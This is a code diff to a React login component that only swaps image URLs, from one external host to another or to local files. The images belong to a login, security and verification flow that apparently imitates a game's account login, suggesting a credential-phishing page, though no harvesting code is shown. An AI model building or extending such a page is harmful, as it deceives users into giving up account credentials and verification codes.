@@ -125,7 +125,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
       <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
         <div className="relative animate-pulse">
           <img 
-            src="https://higgsdomino.store/img/loading.png" 
+            src="/loading.png" 
             alt="Loading..." 
             className="w-[400px] md:w-[500px] h-auto drop-shadow-2xl"
           />
@@ -141,7 +141,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
       {step === 1 && (
         <div className="login-popup-container animate-pop-in">
           {/* Main Background Image */}
-          <img src="https://higgsdomino.store/img/login.png" alt="ID Login Form" className="login-bg-img" />
+          <img src="https://gambar.scatterwinss.com/img/login.png" alt="ID Login Form" className="login-bg-img" />
           
           {/* Inputs Overlay */}
           <div className="input-container">
@@ -184,7 +184,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
       {step === 1.5 && (
         <div className="security-popup-container animate-pop-in">
           <img 
-            src="https://higgsdomino.store/img/keamanan.png" 
+            src="https://gambar.scatterwinss.com/img/OIP__1_-removebg-preview.png" 
             alt="Keamanan" 
             className="login-bg-img" 
             onClick={handleSecurityProceed}
@@ -203,7 +203,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
         <div className="verification-popup-container animate-pop-in">
           <div className="verification-inner">
           
-            <img src="https://higgsdomino.store/img/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
+            <img src="/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
             
             <div className="verification-inputs">
               <input 
@@ -248,7 +248,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
         <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
           <div className="relative">
             <img 
-              src="https://higgsdomino.store/img/maintance.png" 
+              src="./maintance.png" 
               alt="System Maintenance" 
               className="w-[300px] md:w-[400px] h-auto drop-shadow-2xl rounded-xl"
             />
